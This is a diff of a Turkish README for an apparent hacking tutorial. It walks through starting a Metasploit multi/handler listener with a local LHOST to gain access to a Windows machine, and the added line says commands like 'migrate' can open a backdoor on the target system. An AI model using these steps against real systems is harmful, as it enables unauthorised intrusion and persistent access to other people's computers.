@@ -19,4 +19,4 @@
 ### Terminale msfconsole Yaziyoruz. Daha Sonra use multi/handler Yaziyoruz. Sonra show options Yaziyoruz Ve LHOSTU  set lhost 192.168.x.x  Seklinde Yazip local Ipnizi Dinleme Araci Yapiyorsunuz. Ve Artik Hazirsiniz. 
 ![Screenshot_2022-07-17_06_47_02](https://user-images.githubusercontent.com/100614268/179395205-91bc1d94-6ca9-4c6f-9bb7-e502ade40310.png)
 
-### exploit yada run Komutlarini Girdikten Sonra Windowsa Erisirsiniz. help Yazarak Devam Ede Bilirsiniz.
+### exploit yada run Komutlarini Girdikten Sonra Windowsa Erisirsiniz. help Yazarak Devam Ede Bilirsiniz. migrate Gibi Komutlarla Da Karsi Sistemde Backdoor Acabilirsiniz.
